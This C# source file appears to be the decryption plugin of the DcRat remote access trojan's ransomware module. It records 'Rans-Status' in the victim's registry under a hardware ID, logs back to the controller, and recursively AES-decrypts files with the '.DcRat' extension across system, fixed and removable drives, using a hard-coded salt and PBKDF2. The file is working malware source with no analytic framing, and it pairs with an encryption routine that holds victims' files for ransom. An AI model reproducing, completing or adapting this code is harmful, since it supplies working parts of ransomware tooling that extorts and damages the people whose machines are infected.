using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Plugin.Handler
{
    public class HandleDecrypt
    {
        public string Pass;
        private object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);
        
        public void BeforeDec()
        {
            new Thread(Dec).Start();
        }

        public void Dec()
        {
            try
            {
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", "Decryption in progress...");
                Packet.Log("Decrypting...");
                System_Driver(Pass);
                Fix_Drivers(Pass);
                OtherDrivers(Pass);
                Thread.Sleep(1000);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", "Decrypted");
                Packet.Log(Connection.Hwid + "Decrypted");
            }
            catch (Exception ex)
            {
                
            }
        }

        private void System_Driver(string password)
        {
            Dir_Dec(Conversions.ToString(C_DIR), password);
        }

        private void Fix_Drivers(string password)
        {
            foreach (var drive in Environment.GetLogicalDrives())
            {
                var Driver = new DriveInfo(drive);
                if (Driver.DriveType == DriveType.Fixed && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                {
                    string DriverPath = drive;
                    Dir_Dec(DriverPath, password);
                }
            }
        }

        private void OtherDrivers(string password)
        {
            foreach (var drive in Environment.GetLogicalDrives())
            {
                var Driver = new DriveInfo(drive);
                if (!(Driver.DriveType == DriveType.Fixed) && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                {
                    string DriverPath = drive;
                    Dir_Dec(DriverPath, password);
                }
            }
        }

        public byte[] AES_Dec(byte[] B2Dec, byte[] KeyBytes)
        {
            byte[] DecBytes = null;
            var saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (var ms = new MemoryStream())
            {
                using (var AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(KeyBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes((int)(AES.KeySize / (double)8));
                    AES.IV = key.GetBytes((int)(AES.BlockSize / (double)8));
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(B2Dec, 0, B2Dec.Length);
                        cs.Close();
                    }

                    DecBytes = ms.ToArray();
                }
            }

            return DecBytes;
        }

        public void File_Dec(string file, string key)
        {
            try 
            {
                if (file.EndsWith(".DcRat"))
                {
                    var B2Dec = File.ReadAllBytes(file);
                    var KeyBytes = System.Text.Encoding.UTF8.GetBytes(key);
                    KeyBytes = SHA256.Create().ComputeHash(KeyBytes);
                    var BytesDec = AES_Dec(B2Dec, KeyBytes);
                    File.WriteAllBytes(file, BytesDec);
                    string exten = Path.GetExtension(file);
                    string result = file.Substring(0, file.Length - exten.Length);
                    File.Move(file, result);
                }
            }
            catch (Exception ex)
            {
                
            }
        }

        public void Dir_Dec(string ThePath, string key)
        {
            try
            {
                var files = Directory.GetFiles(ThePath);
                var SubDirectories = Directory.GetDirectories(ThePath);
                for (int i = 0, loopTo = files.Length - 1; i <= loopTo; i++)
                    File_Dec(files[i], key);
                for (int i = 0, loopTo1 = SubDirectories.Length - 1; i <= loopTo1; i++)
                    Dir_Dec(SubDirectories[i], key);
            }
            catch (Exception ex)
            {
                
            }
        }
    }
}
